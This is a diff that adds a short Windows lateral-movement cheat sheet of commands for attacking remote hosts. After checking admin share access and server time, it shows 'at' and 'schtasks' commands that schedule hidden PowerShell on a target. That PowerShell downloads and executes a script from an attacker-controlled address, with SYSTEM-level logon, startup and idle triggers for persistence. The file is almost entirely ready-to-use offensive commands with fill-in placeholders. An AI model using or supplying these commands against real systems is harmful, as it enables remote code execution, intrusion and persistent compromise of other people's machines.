@@ -1,0 +1,19 @@
+Windows Lateral Movement Cheat sheet
+#check if admin access
+dir \\[HOST]\C$
+#check the time on remote server
+net time \\[HOST]
+#schedule a job to run, note at is deprecated in win8+
+#Example COMMAND = powershell.exe -NoP -NonI -w HIDDEN -c IEX ((New-Object Net.WebClient).DownloadString('http://[ATTACK_IP]/b'))
+at \\[HOST] [H:MMPM] [COMMAND]
+#eg at \\[TARGET] 8:55PM "powershell.exe -NoP -NonI -w HIDDEN -c IEX ((New-Object Net.WebClient).DownloadString('http://[ATTACK_IP]/b'))"
+#Note: The AT command has been deprecated. Please use schtasks.exe instead.
+
+# schtasks
+#32 bit POWERSHELL_PATH = C:\windows\System32\WindowsPowerShell\v1.0
+#64 bit POWERSHELL_PATH = C:\Windows\syswow64\WindowsPowerShell\v1.0
+#SC_OPTION = onlogon /RU System
+#SC_OPTION = onstart /RU System
+#SC_OPTION = onidle /i 30  (30 minutes after idle)
+#SC_OPTION = once /st [HH:MM:SS 24-hour format] /sd [MM/DD/YYYY] /RU System
+schtasks /CREATE /TN [TASK_NAME] /TR "[POWERSHELL_PATH]\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://[ATTACKER_ADDR]/[SCRIPT]'''))'" /SC [SC_OPTION] /S [TARGET_HOST]
